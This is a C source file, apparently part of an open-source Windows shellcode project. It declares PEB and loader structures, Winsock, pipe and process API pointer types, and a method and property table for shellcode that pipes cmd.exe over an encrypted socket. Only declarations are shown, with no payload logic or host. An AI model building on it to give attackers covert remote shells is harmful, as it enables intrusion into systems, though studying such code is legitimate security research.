/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <winnt.h>
#include <wincrypt.h>

#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif

#include <stddef.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "spp.h"

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

typedef void *PPS_POST_PROCESS_INIT_ROUTINE;

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// PEB defined by rewolf
// http://blog.rewolf.pl/blog/?p=573
typedef struct _PEB_LDR_DATA {
  ULONG      Length;
  BOOL       Initialized;
  LPVOID     SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
  LIST_ENTRY     InLoadOrderLinks;
  LIST_ENTRY     InMemoryOrderLinks;
  LIST_ENTRY     InInitializationOrderLinks;
  LPVOID         DllBase;
  LPVOID         EntryPoint;
  ULONG          SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
  BYTE                         InheritedAddressSpace;
  BYTE                         ReadImageFileExecOptions;
  BYTE                         BeingDebugged;
  BYTE                         _SYSTEM_DEPENDENT_01;

  LPVOID                       Mutant;
  LPVOID                       ImageBaseAddress;

  PPEB_LDR_DATA                Ldr;
  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  LPVOID                       SubSystemData;
  LPVOID                       ProcessHeap;
  LPVOID                       FastPebLock;
  LPVOID                       _SYSTEM_DEPENDENT_02;
  LPVOID                       _SYSTEM_DEPENDENT_03;
  LPVOID                       _SYSTEM_DEPENDENT_04;
  union {
    LPVOID                     KernelCallbackTable;
    LPVOID                     UserSharedInfoPtr;
  };  
  DWORD                        SystemReserved;
  DWORD                        _SYSTEM_DEPENDENT_05;
  LPVOID                       _SYSTEM_DEPENDENT_06;
  LPVOID                       TlsExpansionCounter;
  LPVOID                       TlsBitmap;
  DWORD                        TlsBitmapBits[2];
  LPVOID                       ReadOnlySharedMemoryBase;
  LPVOID                       _SYSTEM_DEPENDENT_07;
  LPVOID                       ReadOnlyStaticServerData;
  LPVOID                       AnsiCodePageData;
  LPVOID                       OemCodePageData;
  LPVOID                       UnicodeCaseTableData;
  DWORD                        NumberOfProcessors;
  union
  {
    DWORD                      NtGlobalFlag;
    LPVOID                     dummy02;
  };
  LARGE_INTEGER                CriticalSectionTimeout;
  LPVOID                       HeapSegmentReserve;
  LPVOID                       HeapSegmentCommit;
  LPVOID                       HeapDeCommitTotalFreeThreshold;
  LPVOID                       HeapDeCommitFreeBlockThreshold;
  DWORD                        NumberOfHeaps;
  DWORD                        MaximumNumberOfHeaps;
  LPVOID                       ProcessHeaps;
  LPVOID                       GdiSharedHandleTable;
  LPVOID                       ProcessStarterHelper;
  LPVOID                       GdiDCAttributeList;
  LPVOID                       LoaderLock;
  DWORD                        OSMajorVersion;
  DWORD                        OSMinorVersion;
  WORD                         OSBuildNumber;
  WORD                         OSCSDVersion;
  DWORD                        OSPlatformId;
  DWORD                        ImageSubsystem;
  DWORD                        ImageSubsystemMajorVersion;
  LPVOID                       ImageSubsystemMinorVersion;
  union
  {
    LPVOID                     ImageProcessAffinityMask;
    LPVOID                     ActiveProcessAffinityMask;
  };
  #ifdef _WIN64
  LPVOID                       GdiHandleBuffer[64];
  #else
  LPVOID                       GdiHandleBuffer[32];
  #endif  
  LPVOID                       PostProcessInitRoutine;
  LPVOID                       TlsExpansionBitmap;
  DWORD                        TlsExpansionBitmapBits[32];
  LPVOID                       SessionId;
  ULARGE_INTEGER               AppCompatFlags;
  ULARGE_INTEGER               AppCompatFlagsUser;
  LPVOID                       pShimData;
  LPVOID                       AppCompatInfo;
  PUNICODE_STRING              CSDVersion;
  LPVOID                       ActivationContextData;
  LPVOID                       ProcessAssemblyStorageMap;
  LPVOID                       SystemDefaultActivationContextData;
  LPVOID                       SystemAssemblyStorageMap;
  LPVOID                       MinimumStackCommit;  
} PEB, *PPEB;

typedef HMODULE (WINAPI* LoadLibrary_t)(
    LPCTSTR lpFileName
);

typedef int (WINAPI* WSACleanup_t)(void);
typedef BOOL (WINAPI* CloseHandle_t)( HANDLE hFile);

typedef BOOL (WINAPI* CreateProcess_t)(
    LPCTSTR               lpApplicationName,
    LPTSTR                lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCTSTR               lpCurrentDirectory,
    LPSTARTUPINFO         lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef HANDLE (WINAPI* CreateThread_t)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

typedef HANDLE (WINAPI* CreateEvent_t)(
    LPSECURITY_ATTRIBUTES lpEventAttributes,
    BOOL                  bManualReset,
    BOOL                  bInitialState,
    LPCTSTR               lpName
);

typedef BOOL (WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT   uExitCode
);

typedef int (WINAPI* WSAStartup_t)(
    WORD      wVersionRequested,
    LPWSADATA lpWSAData
);

typedef SOCKET (WSAAPI* socket_t)(
    int af,
    int type,
    int protocol
);

typedef int (WINAPI* connect_t)(
    SOCKET                s,
    const struct sockaddr *name,
    int                   namelen
);

typedef int (WINAPI* send_t)(
    SOCKET s,
    const char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* recv_t)(
    SOCKET s,
    char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* ioctlsocket_t)(
    SOCKET s,
    long   cmd,
    u_long *argp
);

typedef int (WINAPI* closesocket_t)(
    SOCKET s
);

typedef WSAEVENT (WINAPI* WSACreateEvent_t)(void);

typedef int (WINAPI* WSAEventSelect_t)(
    SOCKET   s,
    WSAEVENT hEventObject,
    long     lNetworkEvents
);

typedef int (WINAPI* WSAEnumNetworkEvents_t)(
    SOCKET             s,
    WSAEVENT           hEventObject,
    LPWSANETWORKEVENTS lpNetworkEvents
);

typedef DWORD (WINAPI* WaitForMultipleObjects_t)(
    DWORD  nCount,
    const HANDLE *lpHandles,
    BOOL   bWaitAll,
    DWORD  dwMilliseconds
);

typedef BOOL (WINAPI* CreatePipe_t)(
    PHANDLE               hReadPipe,
    PHANDLE               hWritePipe,
    LPSECURITY_ATTRIBUTES lpPipeAttributes,
    DWORD                 nSize
);

typedef HANDLE (WINAPI* CreateNamedPipe_t)(
    LPCTSTR               lpName,
    DWORD                 dwOpenMode,
    DWORD                 dwPipeMode,
    DWORD                 nMaxInstances,
    DWORD                 nOutBufferSize,
    DWORD                 nInBufferSize,
    DWORD                 nDefaultTimeOut,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes
);

typedef HANDLE (WINAPI* CreateFile_t)(
    LPCTSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef BOOL (WINAPI* ReadFile_t)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* WriteFile_t)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* GetOverlappedResult_t)(
    HANDLE       hFile,
    LPOVERLAPPED lpOverlapped,
    LPDWORD      lpNumberOfBytesTransferred,
    BOOL         bWait
);

typedef int (WINAPI* bind_t)(
    SOCKET                s,
    const struct sockaddr *name,
    int                   namelen
);

typedef int (WINAPI* listen_t)(
    SOCKET s,
    int    backlog
);

typedef SOCKET (WINAPI* accept_t)(
    SOCKET          s,
    struct sockaddr *addr,
    int             *addrlen
);

typedef int (WINAPI* shutdown_t)(
    SOCKET s,
    int    how
);

typedef FARPROC (WINAPI* GetProcAddress_t)(
    HMODULE hModule,
    LPCSTR  lpProcName
);

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)
#define HTONS(x) ((((WORD)(x) & 0xff00) >> 8) | (((WORD)(x) & 0x00ff) << 8))

// shellcode methods
typedef struct _sc_methods_t {
  union {
    LPVOID api[26];
    struct {
      // kernel32
      CreateNamedPipe_t         pCreateNamedPipe;
      CreatePipe_t              pCreatePipe;
      CreateFile_t              pCreateFile;
      WriteFile_t               pWriteFile;
      ReadFile_t                pReadFile;
      GetOverlappedResult_t     pGetOverlappedResult;
      CreateProcess_t           pCreateProcess;
      TerminateProcess_t        pTerminateProcess;
      CreateEvent_t             pCreateEvent;
      CloseHandle_t             pCloseHandle;
      WaitForMultipleObjects_t  pWaitForMultipleObjects;
      LoadLibrary_t             pLoadLibrary;
      
      // ws2_32
      socket_t                  psocket;
      shutdown_t                pshutdown;
      send_t                    psend;
      recv_t                    precv;
      closesocket_t             pclosesocket;
      ioctlsocket_t             pioctlsocket;
      WSAEventSelect_t          pWSAEventSelect;
      WSAEnumNetworkEvents_t    pWSAEnumNetworkEvents;
      WSACreateEvent_t          pWSACreateEvent;
      WSAStartup_t              pWSAStartup;
      connect_t                 pconnect;
      bind_t                    pbind;
      listen_t                  plisten;
      accept_t                  paccept;          
    };
  };
} m_tbl;

// shellcode properties
typedef struct _sc_properties_t {
  SOCKET              s;
  HANDLE              out1;    // CreateNamedPipe
  HANDLE              in0;     // CreatePipe read
  HANDLE              in1;     // CreatePipe write
  HANDLE              out0;    // CreateFile
  HANDLE              evt0;    // WSACreateEvent
  HANDLE              evt1;    // CreateEvent for cmd.exe
  PROCESS_INFORMATION pi;      //
  DWORD               evt_cnt; // number of events to monitor
  BYTE                strkey[32];
  spp_buf             buf;
  crypto_ctx          ctx;
} p_tbl;

// shellcode class
typedef struct sc_cls_t {
  m_tbl               m;       // methods    (code section)
  p_tbl               p;       // properties (data section)
} sc_cls;

